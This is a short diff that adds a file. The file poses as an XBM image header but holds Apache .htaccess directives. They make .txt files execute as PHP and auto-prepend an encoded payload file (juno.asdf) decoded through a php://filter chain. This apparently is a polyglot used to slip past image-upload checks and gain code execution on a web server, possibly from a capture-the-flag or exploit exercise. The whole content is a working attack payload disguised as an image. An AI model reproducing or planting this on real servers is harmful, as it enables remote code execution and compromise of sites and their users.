@@ -1,0 +1,4 @@
+#define 915eefb1c517499ad090b8b05623cdad_width 1337
+#define 915eefb1c517499ad090b8b05623cdad_height 1337
+AddType application/x-httpd-php .txt
+php_value auto_prepend_file "php://filter/convert.quoted-printable-decode/resource=./juno.asdf"
